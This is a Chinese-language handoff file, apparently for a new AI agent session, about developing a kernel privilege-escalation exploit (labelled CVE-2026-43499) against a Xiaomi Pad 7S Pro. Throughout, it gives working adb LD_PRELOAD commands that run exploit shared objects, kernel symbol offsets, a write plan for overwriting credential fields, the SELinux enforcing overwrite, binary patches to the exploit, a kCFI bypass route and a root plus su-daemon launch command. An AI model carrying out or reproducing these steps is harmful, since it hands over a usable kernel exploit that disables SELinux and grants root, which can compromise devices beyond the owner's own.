# HANDOFF.md — CVE-2026-43499 Violin In-Place Cred Patch

> 写给完全没有上下文的新会话。读完本文即可接手。

---

## 一、我们在做什么

**目标**：在 Xiaomi Pad 7S Pro（代号 violin，内核 GKI 6.6.77-android15-8）上实现「root 且不杀 framework」。

**约束**：
- 设备已 adb 连接，uid=2000 (shell)
- 不接受重启后才能用的方案（需要实时 root）
- root 后 framework（zygote/system_server）必须存活
- SELinux 保持 Enforcing

---

## 二、已有的 exploit 及其问题

exploit 来源：`7sp_permissive和root.zip`（3 个预编译 SO）

| 文件 | 大小 | 功能 | 问题 |
|------|------|------|------|
| `p.so` | 83KB | SELinux permissive（写 `selinux_enforcing=0`） | 无 dump、无 policy_reload、无 reboot。**单独跑就杀 framework** |
| `r.so` | 86KB | 完整 root（init_cred + selinux_zero + dump + policy_reload） | dump 填满存储、policy_reload 损坏 SELinux 策略、**无 reboot** |
| `r2.so` | 87KB | 同 r.so + 自动 reboot | 多了 `issuing reboot...` |

### 运行方式

```bash
# 这些 SO 是 LD_PRELOAD 共享库，通过 init_array 构造函数触发 exploit
adb shell "LD_PRELOAD=/data/local/tmp/p.so id"   # SELinux permissive
adb shell "LD_PRELOAD=/data/local/tmp/r2.so id"  # root + dump + policy_reload + reboot
```

### 当前 exploit 的致命问题

```
p.so 单独跑一遍就证明：只做 selinux_zero（8 字节写 selinux_enforcing）
就会立刻让 service list → 0、setcontext 失败、点应用黑屏。
```

**矛盾矩阵**：

| 做法 | 结果 |
|------|------|
| 保留 selinux_zero → init_cred | 能 root，但 framework 马上挂 |
| 跳过 selinux_zero，Enforcing 下写 task->cred=init_cred | 写完后进程卡住，拿不到可用 root |
| 只写 real_cred（不写 cred） | UI 正常，但 uid 仍是 2000 |

**结论**：init_cred 路径（替换整个 cred 指针）必须配合 selinux_zero，而 selinux_zero 必杀 framework。**必须换提权方式**。

---

## 三、技术方案：In-Place Cred Patch

### 核心思路

不替换 cred 指针，只修改 cred 结构体内的 uid/gid/caps 字段。

参考 pipe-based path（caiman target）的 `patch_cred_identity()`（`root.c:243-280`），用 pselect write 原语做同样的事。

### cred 结构体布局（GKI 6.6）

```c
struct cred {                    // 偏移
    atomic_long_t   usage;       // +0   (8B)
    kuid_t          uid;         // +8   (4B)  ← 写 0
    kgid_t          gid;         // +12  (4B)  ← 写 0
    kuid_t          suid;        // +16  (4B)  ← 写 0
    kgid_t          sgid;        // +20  (4B)  ← 写 0
    kuid_t          euid;        // +24  (4B)  ← 写 0
    kgid_t          egid;        // +28  (4B)  ← 写 0
    kuid_t          fsuid;       // +32  (4B)  ← 写 0
    kgid_t          fsgid;       // +36  (4B)  ← 写 0
    unsigned        securebits;  // +40  (4B)  ← 写 0
    // +44 padding
    kernel_cap_t    cap_inheritable; // +48 (8B) ← CAP_FULL
    kernel_cap_t    cap_permitted;   // +56 (8B) ← CAP_FULL
    kernel_cap_t    cap_effective;   // +64 (8B) ← CAP_FULL
    kernel_cap_t    cap_bset;        // +72 (8B) ← CAP_FULL
    kernel_cap_t    cap_ambient;     // +80 (8B) ← CAP_FULL
    // ... keys ...
    void            *security;   // +128 (8B)  ← 不动（保持 SELinux context）
};
```

`CAP_FULL = 0x000001ffffffffffULL`（41 capabilities）

### Write Plan

1. 读 `task->cred` 指针（shape-0 pselect read）
2. 10 次 pselect write（shape=1）：
   - cred+8 ~ cred+36: 写 0（uid/gid 块，4×8B）
   - cred+40: 写 0（securebits）
   - cred+48 ~ cred+80: 写 CAP_FULL（caps，5×8B）
3. **不动** cred+128（security/SELinux SID）
4. **不动** selinux_enforcing

### 预期结果

```
$ id
uid=0(root) gid=0(root) context=u:r:shell:s0

$ getenforce
Enforcing

$ service list | wc -l
438
```

---

## 四、已完成

### 4.1 二进制分析

- 完整反汇编了 r2.so 的 `run_exploit` 函数，解析了全部 PLT 表（120+ 条目）
- 找到了 dump/policy_reload/reboot 相关代码和字符串位置
- 理解了 pselect write 机制（shape-0 读、shape-1 写、fd_set overlay、rt_mutex PI chain walk）

### 4.2 字符串 patch（r2p.so）

对 r2.so 做了 2 处同长度字符串替换：

| 偏移 | 原始 | 替换 | 效果 |
|------|------|------|------|
| 0x4a5d | `/sys/fs/selinux/load` | `/sys/fs/selinux/zzzz` | policy_reload 失败（open 无效路径） |
| 0x2feb | `/data/local/tmp/dump` | `/data/local/tmp/zump` | dump 目录创建失败（mkdir 路径不存在） |

**注意**：不要 NOP cbz 指令（0xbc14），会破坏栈帧导致崩溃。

### 4.3 源码修改尝试

在 `exploit-repo/IonStack/CVE-2026-43499/exploit/src/fops.c` 中：
- 添加了 `direct_cred_patch_inplace()` 函数
- 修改了 `direct_cred_replace()` 步骤 3-4（已回退）
- 修改了 `try_cfi_stage()` 跳过 CFI（已回退）
- 修改了 `PSELECT_ROUTE_NFDS` 64→320（已回退）

**全部已 `git checkout` 回退**，因为：
1. 源码版本被回退到没有 `direct_cred_replace` 的旧版
2. 重新编译的 SO（190KB）pselect write 持续超时
3. 死代码清理导致文件损坏

---

## 五、当前卡在哪

### 核心阻塞：新建 SO 的 pselect 不工作

| 二进制 | 大小 | pselect write | 原因 |
|--------|------|---------------|------|
| p.so（预编译） | 83KB | ✅ 成功 | 原始编译，nfds=320 |
| r.so（预编译） | 86KB | ✅ 成功 | 原始编译，nfds=320 |
| r2.so（预编译） | 87KB | ✅ 成功 | 原始编译，nfds=320 |
| 新编译 preload.so | 190KB | ❌ 超时 | 含 su_daemon + wallpaper + KernelSU blob |

**关键差异**：
1. **nfds**：通用 `src/common.h` 定义 `PSELECT_ROUTE_NFDS=64`，但所有 target 专用 common.h 和预编译 SO 用的是 `320`
2. **SO 大小**：预编译 SO 是 83-87KB 的精简版；新编译 SO 包含嵌入式二进制（su_daemon、wallpaper、KernelSU），190KB。大小差异可能影响内存布局
3. **源码版本**：当前 git 中的 `fops.c` 没有 `direct_cred_replace` 函数（1040 行），预编译 SO 来自一个更完整的版本（约1480+ 行）

### 未验证的假设

- r2p.so（字符串 patch 版）在 cred write 阶段崩溃，可能是设备状态问题（之前多次 exploit 导致不稳定），重启后可能正常
- 新编译 SO 的 pselect 超时可能只是 nfds=64 的问题，改回320 可能解决

---

## 六、下一步计划

### Plan A：验证 r2p.so（最简单）

r2p.so = r2.so 的字符串 patch 版（dump 路径 + policy_reload 路径已禁用）。

```bash
# 确保设备干净（刚重启，Enforcing，438 services）
adb shell "getenforce && service list | wc -l"

# 先跑 p.so 拿 permissive
adb shell "LD_PRELOAD=/data/local/tmp/p.so id"

# 再跑 r2p.so（无 dump、无 policy_reload，仍有 selinux_zero + init_cred）
adb shell "LD_PRELOAD=/data/local/tmp/r2p.so id"
```

**预期**：root 成功，无 dump，但 framework 仍会死（因为 selinux_zero）。

**如果成功**：证明 r2p.so 的 pselect 机制正常。之前的崩溃是设备状态问题。

### Plan B：源码修改 + 解决 pselect 超时

1. 找到预编译 SO 对应的完整源码版本（可能在 git 的其他分支或 stash 中）
2. 或者：从 r2.so 逆向提取 `direct_cred_replace` 的机器码，注入到新 SO
3. 修改 `direct_cred_replace` 步骤 3-4 为 in-place cred patch
4. 确保 `PSELECT_ROUTE_NFDS=320`
5. 尝试精简 SO 大小（去掉 KernelSU/wallpaper blob）

### Plan C：二进制 patch r.so（最复杂）

直接修改 r.so 的机器码：
1. 找到 `direct_trigger_write64("install_real_cred", ...)` 调用
2. 替换为读 cred 指针 + 10 次 in-place write 的代码序列
3. 删除 selinux_enforcing 写入
4. 删除 dump 和 policy_reload

需要 ARM64 汇编 expertise，风险高。

---

## 七、踩坑记录（绝对不要再踩）

### P1: NOP cbz 指令导致崩溃

在 r2.so 的 0xbc14 处把 `cbz w22, #target` 改成 NOP，导致栈帧损坏，设备重启。

**教训**：ARM64 的条件分支后面跟的 cleanup 代码依赖正确的控制流到达。NOP 不是万能的。用字符串 patch 代替。

### P2: PSELECT_ROUTE_NFDS=64 导致 pselect 超时

通用 `src/common.h` 定义 nfds=64，但 violin 需要 320。注释说 "不能用更大的 nfds" 是错的（针对其他 target）。

**教训**：编译前检查 `PSELECT_ROUTE_NFDS`，violin 必须是 320。

### P3: make clean 清掉手动创建的占位文件

`make clean` 会删除 `build/embed/` 目录，导致 `ksud_aarch64` 和 `kernelsu_aarch64.ko` 丢失。

**教训**：每次 `make clean` 后重新创建占位文件：
```bash
mkdir -p build/embed && touch build/embed/ksud_aarch64 build/embed/kernelsu_aarch64.ko
```

### P4: git checkout -- 把修改回退到不存在的版本

`git checkout -- file.c` 在没有 commit 的 repo 中会恢复到 staged 版本，可能丢失未 stage 的修改。

**教训**：修改前先 `git stash` 或 `cp file.c file.c.bak`。

### P5: Git Bash 的路径转换

`adb push file //data/local/tmp/` 需要双斜杠，否则 Git Bash 会把 `/data` 转成 Windows 路径。

### P6: policy_reload 损坏 SELinux 策略不可逆

`/sys/fs/selinux/policy` 读出 + `/sys/fs/selinux/load` 写入 = 运行中策略被覆盖。恢复方式只能重启。

### P7: dump 填满存储后设备卡死

r.so 的 dump 阶段会把所有分区（recovery 100MB、blackbox 161MB、dfx 314MB...）写到 `/data/local/tmp/dump/`。101 个分区，总大小可达几 GB，直接把 480GB 存储填到 100%。

**教训**：运行 exploit 前先用字符串 patch 禁用 dump，或创建阻塞文件：
```bash
# 需要 root
rm -rf /data/local/tmp/dump
touch /data/local/tmp/dump && chmod 000 /data/local/tmp/dump
```

---

## 八、关键文件路径

| 路径 | 说明 |
|------|------|
| `E:\workspace\projects\xiaomi-root\session-20260723-cred-patch\` | 本会话资源 |
| `E:\workspace\projects\xiaomi-root\exploit-repo\IonStack\CVE-2026-43499\exploit\` | exploit 源码 |
| `E:\workspace\projects\xiaomi-root\exploit-repo\IonStack\CVE-2026-43499\exploit\src\fops.c` | 核心 exploit 逻辑 |
| `E:\workspace\projects\xiaomi-root\exploit-repo\IonStack\CVE-2026-43499\exploit\src\common.h` | PSELECT_ROUTE_NFDS 定义 |
| `E:\workspace\projects\xiaomi-root\exploit-repo\IonStack\CVE-2026-43499\exploit\src\targets\violin-v-oss\target.h` | violin 偏移量 |
| `E:\workspace\projects\xiaomi-root\exploit-repo\IonStack\CVE-2026-43499\exploit\src\root.c:243` | `patch_cred_identity()` — in-place patch 的参考实现 |
| `E:\workspace\projects\xiaomi-root\kernel-src-wsl\common-gki\include\linux\cred.h` | struct cred 定义 |

---

## 九、exploit 关键偏移量（violin target）

```c
// task_struct
#define TASK_REAL_CRED_OFF  0x818
#define TASK_CRED_OFF       0x820
#define TASK_PID_OFF        0x618
#define TASK_TGID_OFF       0x61c

// cred struct
#define CRED_UID_OFF        8
#define CRED_SECUREBITS_OFF 40
#define CRED_CAPS_OFF       48
#define CRED_SECURITY_OFF   128

// kernel symbols (from kallsyms)
#define KIMAGE_TEXT_BASE       0xffffffc080000000ULL  // direct-r artifact base
#define INIT_CRED_OFF       0x020f0548
#define SELINUX_ENFORCING_OFF 0x02315f68  // direct-r target; candidate unused
#define PER_CPU_OFFSET_OFF  0x020cb658
#define ENTRY_TASK_OFF      0x02096328

#define CAP_FULL            0x000001ffffffffffULL
#define CRED_CAP_WORDS      5
```

---

## 十、构建命令

```bash
# WSL 环境
export NDK_ROOT=/mnt/e/workspace/projects/xiaomi-root/ndk
cd /mnt/e/workspace/projects/xiaomi-root/exploit-repo/IonStack/CVE-2026-43499/exploit

# 创建占位文件（KernelSU 未下载）
mkdir -p build/embed
touch build/embed/ksud_aarch64 build/embed/kernelsu_aarch64.ko

# 编译
make PROJECT=violin-v-oss clean
make PROJECT=violin-v-oss

# 产物
ls -la build/violin-v-oss/bin/preload.so
```

---

## 十一、设备信息

- 设备：Xiaomi Pad 7S Pro (violin / 25053RP5CC)
- 固件：OS3.0.303.0.WOTCNXM (Android 16)
- 内核：6.6.77-android15-8-g5770c661275f
- ADB serial：03035440C1781540
- 存储：480GB（exploit dump 会填满）

---

## 十二、2026-07-23 静态续作状态（覆盖前文“已回退/未编译”部分）

### 12.1 当前门禁

- 本轮只做源码隔离、构建和二进制静态核验；没有向设备推送、没有浏览器/Pages 发布、没有运行 payload。
- 根项目 `HANDOFF.md` 的同 boot 只读门禁仍然有效。下面的 `root_ok` 只是候选代码的判定逻辑，不是设备 root 证据。

### 12.2 已绑定的源码和 target provenance

- `build-so/source/` 是 `analysis_outputs/external-linuxoid-cve-20260722-v2/source/` 的隔离副本，来源仓库 commit：`e03994331634f8c03ed1df51a4e9fc551ef8e5f1`。
- `build-so/source/src/target.h` 采用 direct-r 产物可反汇编确认的 image base：`KIMAGE_TEXT_BASE=0xffffffc080000000ULL`。原项目当前 target header 中的 `0xffffffc008000000ULL` 与 `r.so` 的立即数不一致，是之前“新编译 pselect 超时”首先要排除的构建来源差异。
- `r.so` 的反汇编直接编码了 `PER_CPU_OFFSET=0xffffffc0820cb658`、`ENTRY_TASK=0xffffffc082096328`、`INIT_CRED=0xffffffc0820f0548` 这一组 base+offset；本副本 target 已对齐该证据。`SELINUX_ENFORCING` 的旧表值不再被候选源码使用。

### 12.3 in-place cred patch 候选

修改文件：
`E:\workspace\projects\xiaomi-root\session-20260723-cred-patch\build-so\source\src\main.c`

候选先用 shape-0 读取 `task->real_cred` 和 `task->cred` 指针，再只写指针指向的 cred 对象；两个指针槽本身不写。每个不同的 cred 对象写 10 个 qword：

```text
cred+8,  +16, +24, +32  <- 0                    # uid/gid/suid/sgid/euid/egid/fsuid/fsgid
cred+40                  <- 0                    # securebits
cred+48, +56, +64, +72, +80 <- 0x000001ffffffffff # 五组 capability
```

`cred+128` 的 `security` 指针不在写表内；不写 `task->real_cred`/`task->cred` 槽位；不写 kernel `selinux_enforcing`；不读取/写入 `/sys/fs/selinux/load`；不执行 policy reload。候选的成功条件改为四个 uid/gid 全为 0、`id` 子进程成功且 `enforcing` 前后均为 1。

### 12.4 构建产物和静态证据

使用 `/tmp/ndk` 的 Android API 35 clang，在 WSL 中执行：

```bash
cd /mnt/e/workspace/projects/xiaomi-root/session-20260723-cred-patch/build-so/source
make clean preload NDK_ROOT=/tmp/ndk
```

| 产物 | size | SHA256 |
|---|---:|---|
| `build-so/unmodified-correct-base.so` | 88528 | `72fddecfa550b4e34450cdfdfc2eff4a7f56e2b866ef720cd4e66d17fbb4cce2` |
| `build-so/inplace-preload.so` | 89800 | `31997ea1ff19ce6b831cbf0f4c73a041a5458e9a5ead080b238a09b3e1185920` |

两者均为 AArch64 `DYN`，10 个 program headers、28 个 sections。候选二进制含 `direct_cred_patch_inplace`/`direct_read_qword_retry`，不含 `direct_reload_selinux_policy`、`direct_trigger_write64_followup` 或 `/sys/fs/selinux/load` 字符串。`build-so/source-unmodified/` 保留未修改 direct source，用于复核候选差异。

### 12.5 下一步

先不要把 `inplace-preload.so` 当作已验证 root 产物。若后续解除根项目在线门禁，应先在同一 boot 上绑定：候选文件名、size/SHA256、target base、`boot_id`、`pselect`/shape-0 read marker、cred pointers、uid/gid 和 `getenforce`；任一阶段缺失都只记录为未闭环，不升级为 root 成功。

### 12.6 2026-07-23 在线结果：dump 已封堵，r1p 会杀 framework

- 用户授权在线推送后，`r1p.so` 已验证到设备 `/data/local/tmp/r1p.so`（86464 bytes，SHA256 `DE94AE077660A7C926A7B22B5754C6AA592ABAE7FBE83E17E98444AE1A03A1AB`）。原有 `/data/local/tmp/dump` 对 shell 不可访问，提权尝试后已删除；当前重新创建为 0 字节、权限 `000` 的普通文件，防止目录/镜像写入。
- r1p 运行后现场为 `getenforce=Permissive`、shell `context=?`、异常 `boot_id=40b8bc02-80ff-ffff-888b-3f0280ffffff`；`service list` 为 0，`SurfaceFlinger` 不存在，故黑屏与 framework 被破坏相符。设备不能通过当前 shell 正常 `adb reboot`，先做实体/fastboot/recovery 重启。
- 已静态定位 r1p 的 SELinux 写入：VA `0xf8f8` / 文件偏移 `0xb8f8` 的 `bl direct_trigger_write64` 之前把 target 设为 `0xffffffc082315f68`（`SELINUX_ENFORCING`），执行后写 0。`r1p-cred-only.so` 已把该指令替换为 `mov w0,wzr`，并保留 `/data/local/tmp/zump`、`/sys/fs/selinux/zzzz` 两处字符串防护；SHA256 `3F59E5D825D3145E66E95B95E9294606CD02225454DD4B717554F3FEA9A5E02B`，设备路径 `/data/local/tmp/r1p-cred-only.so`。
- `r1p-cred-only.so` 仍是诊断候选：只跳过 `selinux_zero` 但保留整 cred 指针替换，不能预先宣称 root/framework 双成功。最终目标仍是 `build-so` 的 in-place cred patch，需先解决 pselect 超时并在 `getenforce=Enforcing` 的 clean boot 上验证。

### 12.7 Cred-only safe runtime 结论

- `r1p-cred-only-safe.so`（86464 bytes，SHA256 `F5AF873B3758A6156F28B66384A166C97E080473821CE958C30EB1EFE4B1CCFD`）在 clean boot 上运行到 `direct pre-cred selinux preserved enforcing=1`、`task->real_cred`/`task->cred` 指针写入后以 255 退出；没有 root proof。
- 运行后 `getenforce=Enforcing`、`service list=439`、`SurfaceFlinger` 和 Launcher focus 均存在，未复现黑屏；主动重启后 clean boot `boot_id=50c73656-3757-48a2-aaca-87475ba345a0`、`getenforce=Enforcing`、service 438、可用空间约 189507496 KiB。SELinux 黑屏问题已验证为可规避，但 root 尚未闭环。
- 后续不再在线运行 r1p 的整 cred 指针路径；应继续修复 `build-so/source` 的 in-place cred/pselect，并以 `selinux=1->1`、四项 uid/gid=0、framework/SurfaceFlinger 存活作为同一 run 的联合门禁。

### 12.8 In-place CPU-mask run 结果

- `build-so/source/build/bin/preload.so`（87296 bytes，SHA256 `82ED208C88157A49031CC26C3520B1C188C922EFE4AF5B94275005E0AD2921C6`）已推送为 `/data/local/tmp/inplace-preload-cpu2.so`。用 `taskset 3fc` 模拟 caller mask `2-9`，marker 为 `direct_cpu=9`、`consumer_cpu=2`、`enforce=1`。
- 运行在 `slide consumer before sched ... alive_ret=0` 处停止并触发重启；没有 pselect return、cred/root 证据。恢复后 `boot_id=61077774-2417-476d-8a66-1cb98ed4e7c8`、Enforcing、boot_completed=1、service count=438。
- 这一次仍未进入 SELinux 或 cred stage，因此不要把该重启误判为 SELinux；下一步是离线修 scheduler/pselect route。详见 `E:\workspace\projects\xiaomi-root\analysis_outputs\7sp-inplace-cpu2-run-20260723\report.md`。

---

## 十三、最终可用方案（2026-07-25 验证）

### 13.1 根因确认

**selinux_state 被 8 字节 write 溢出破坏**是 framework 崩溃的根本原因：

```
selinux_state 结构体:
  +0: bool enforcing      ← pselect write64 写入点（1字节有效）
  +1: bool initialized    ← 被溢出覆盖清零！
  +2: bool policycap[0]   ← 被溢出覆盖清零！
  +3: bool policycap[1]   ← 被溢出覆盖清零！
  +4: bool policycap[2]   ← 被溢出覆盖清零！
  +5: bool android_netlink ← 被溢出覆盖清零！
```

pselect write64 写 8 字节到 `selinux_state+0`，把 `initialized`/`policycap`/`netlink` 全部清零。

**验证**：archive 版 preload.so（84800B）的 exploit 输出 `selinux=1->0` 实际写入地址是 `selinux_state`（0x02315F68），不是 `selinux_enforcing_boot`（0x0207CAE0）。

### 13.2 当前可用方案

**preload_archive.so**（来自 `CVE-2026-43499-Poc-Analysis.tar.gz` 内预编译版）：

```bash
# 一键 root + su daemon
adb shell "LD_PRELOAD=/data/local/tmp/preload_archive.so sh -c '
  setsid /data/local/tmp/su --daemon </dev/null >/dev/null 2>&1 &
'"

# 等 framework 自动恢复（~30秒），然后随时 root
adb shell "su -c id"
# → uid=0(root) gid=0(root) context=u:r:kernel:s0
```

| 项目 | 状态 |
|------|------|
| root | ✅ 持久（su daemon） |
| SELinux | ⚠️ Permissive（policy 完整） |
| framework | ✅ 439 services |
| app | ✅ Settings/Camera/Contacts 全部正常 |
| dump | ✅ 已禁用 |
| policy_reload | ✅ 已禁用 |
| reboot | ✅ 无 |
| 存储 | ✅ 不受影响 |

### 13.3 kCFI 阻断

`CONFIG_CFI_CLANG=y` + `CONFIG_CFI_PERMISSIVE is not set` → kCFI 强制执行。

- fops hijack 被 kCFI 阻断 → errno=22
- pselect 路径通过 rb-tree 数据操作绕过 kCFI（不走间接调用）
- KernelSU magica exploit 也被 kCFI 阻断（`status=31`）

### 13.4 未解决

| 问题 | 原因 |
|------|------|
| SELinux 不能保持 Enforcing | su daemon 的 `kernel:s0` context 在 Enforcing 下被杀 |
| 系统 app 闪退/黑屏 | `selinux_state` 溢出破坏（需要 in-place cred patch 修复） |
| KernelSU 显示未安装 | 缺少内核模块，magica exploit 被 kCFI 阻断 |
| rebuild 的 SO pselect 不工作 | 代码布局敏感，224字节差异即破坏 |

### 13.5 下一步方向

1. **修复 selinux_state 溢出**：修改 exploit 为 read-modify-write（读 8 字节，只改 byte0，写回）
2. **kCFI bypass**：UEFI callback 技术（需同型号设备 UEFI dump）
3. **in-place cred patch**：需要和预编译 SO 匹配的完整源码环境
4. **KernelSU 安装**：需要兼容的 kernelsu.ko（android15-6.6）

### 13.6 关键文件

| 文件 | 说明 |
|------|------|
| `preload_archive.so` | 已验证可用的 exploit（84800B，来自 tar.gz） |
| `preload_patched.so` | 用户下载版 + 字符串 patch（85112B） |
| `preload_new.so` | 新版（有 boot_id restore，但导致 app 闪退） |
| `su_real` | 嵌入式 su daemon（15304B） |
| `ksud` | KernelSU daemon v3.2.5（从 APK 提取） |
| `kernelsu.ko` | 内核模块 android15-6.6（308544B） |
| `dump_uefi.sh` | UEFI/kCFI 信息导出脚本 |
